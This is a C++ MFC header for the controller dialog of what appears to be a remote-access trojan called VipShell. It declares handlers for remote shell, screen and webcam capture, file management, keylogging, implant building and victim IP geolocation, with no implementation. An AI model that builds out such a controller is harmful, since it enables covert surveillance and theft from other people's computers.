// VipClientDlg.h : header file
//

#if !defined(AFX_VIPCLIENTDLG_H__1C1F4839_4435_4046_8126_FA047771C3C7__INCLUDED_)
#define AFX_VIPCLIENTDLG_H__1C1F4839_4435_4046_8126_FA047771C3C7__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include <map>
#include ".\vipshellclientserver.h"
#include "afxcmn.h"
#include "NL_QQwry.h"
/////////////////////////////////////////////////////////////////////////////
// CVipClientDlg dialog

struct tagServerItem
{
	tagServerSystemInfo Info;
};

class CVipClientDlg : public CDialog
{
// Construction
public:
	CVipClientDlg(CWnd* pParent = NULL);	// standard constructor

// Dialog Data
	//{{AFX_DATA(CVipClientDlg)
	enum { IDD = IDD_VIPCLIENT_DIALOG };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CVipClientDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

	//≈≈–Ú
	static int CALLBACK SortCompareStringFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
public:
	CServerFileManageHandle::File_Info_Vector m_FileInfo;
	int m_nHeadItem;
	bool m_bCompareType;
	NL_QQwry m_QQwry;
protected:
	CImageList m_ServerImgList;
public:
	CServerConnectHandle* _GetServerByLastCmd(DWORD dwTime, DWORD* dwRet = NULL);
	void _QueryServerConnect();
	void _CheckServerConnect();
// Implementation
protected:
	typedef std::map<SOCKET, CServerConnectHandle> SERVER_MAP;
	SERVER_MAP m_servermap;
	CVipShellClientServer m_hServer;
	HICON m_hIcon;

	// Generated message map functions
	//{{AFX_MSG(CVipClientDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
protected:
	typedef std::map<DWORD,SOCKET> SERVERINPUT_MAP;
	SERVERINPUT_MAP m_ServerInputMap;
protected:
	void Layout();
	CStatusBarCtrl m_wndStatusBar;
protected:
	CString _GetServerEditionString(DWORD dwMajorVersion,DWORD dwMinorVersion, DWORD dwPlatformId);
	CString _GetMakeCareerString(DWORD dwTime);
	CString _GetMemoryString(DWORD dwMenorySize);
	CString _GetCpuString(DWORD dwCpu);
	void OnServerLink(CServerConnectHandle* hServer);
	void OnShellLink(CServerShellHandle* hServer);
	void OnScreenLink(CServerScreenInfoHandle* hServer);
	void OnCapLink(CServerGetCapPictureHandle* hServer);
	void OnFileManageLink(CServerFileManageHandle* hServer);
	void OnKeyLogLink(CServerGetKeyNoHookHandle* hServer);
	CServerConnectHandle* _GetSelServer(DWORD dwItem = -1);
public:
//	int GetSelItemToVector(std::vector<>);
	int GetSelItem();
public:
	afx_msg void OnTimer(UINT nIDEvent);
protected:
	virtual void OnCancel();
public:
	CListCtrl m_ListServer;
	afx_msg void OnBnClickedButtonGetscreen();
	afx_msg void OnBnClickedButtonGetshell();
	afx_msg void OnBnClickedOk();
	afx_msg void OnBnClickedButtonGetcap();
	afx_msg void OnBnClickedButtonFilemanage();
	afx_msg void OnBnClickedButtonProcessList();
	afx_msg void OnBnClickedButtonGetKeyLog();
	afx_msg void OnNMRclickListServer(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnBnClickedVipshellExplain();
	afx_msg void OnBnClickedVipshellDownfile();
	afx_msg void OnBnClickedVipshellMakefile();
	afx_msg void OnBnClickedButtonUpdateip();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnHdnItemclickListServer(NMHDR *pNMHDR, LRESULT *pResult);
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_VIPCLIENTDLG_H__1C1F4839_4435_4046_8126_FA047771C3C7__INCLUDED_)
